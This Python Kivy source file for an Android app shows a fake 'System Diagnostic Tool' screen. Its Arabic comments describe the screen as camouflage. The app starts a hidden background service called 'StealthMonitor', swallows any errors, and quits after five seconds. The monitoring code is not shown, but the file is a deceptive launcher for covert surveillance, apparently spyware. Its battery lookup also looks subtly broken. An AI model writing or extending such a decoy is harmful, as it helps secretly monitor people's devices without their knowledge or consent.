import time
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
from android import service

# جلب كلاسات أندرويد للحصول على معلومات النظام
Build = autoclass('android.os.Build')
VERSION = autoclass('android.os.Build$VERSION')
PowerManager = autoclass('android.os.PowerManager')
Context = autoclass('android.content.Context')

class MainApp(App):
    def build(self):
        # الحصول على معلومات البطارية
        try:
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getSystemService(Context.POWER_SERVICE)
            battery = pm.getIntProperty(pm.BATTERY_PROPERTY_CAPACITY)
        except:
            battery = "N/A"

        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        # نص التمويه: معلومات حقيقية عن الجهاز
        info = (
            f"[b]System Diagnostic Tool[/b]\n\n"
            f"Device: {Build.MANUFACTURER} {Build.MODEL}\n"
            f"Android Version: {VERSION.RELEASE} (API {VERSION.SDK_INT})\n"
            f"Battery: {battery}%\n"
            f"Status: Optimizing system resources..."
        )
        
        label = Label(text=info, markup=True, halign='center', valign='middle')
        layout.add_widget(label)
        
        # بدء الخدمة الخلفية (monitor.py)
        try:
            service.start_service('StealthMonitor', '')
        except:
            pass
        
        # جدولة إغلاق التطبيق بعد 5 ثوانٍ
        Clock.schedule_once(self.close_app, 5)
        
        return layout
    
    def close_app(self, dt):
        self.stop()

if __name__ == '__main__':
    MainApp().run()
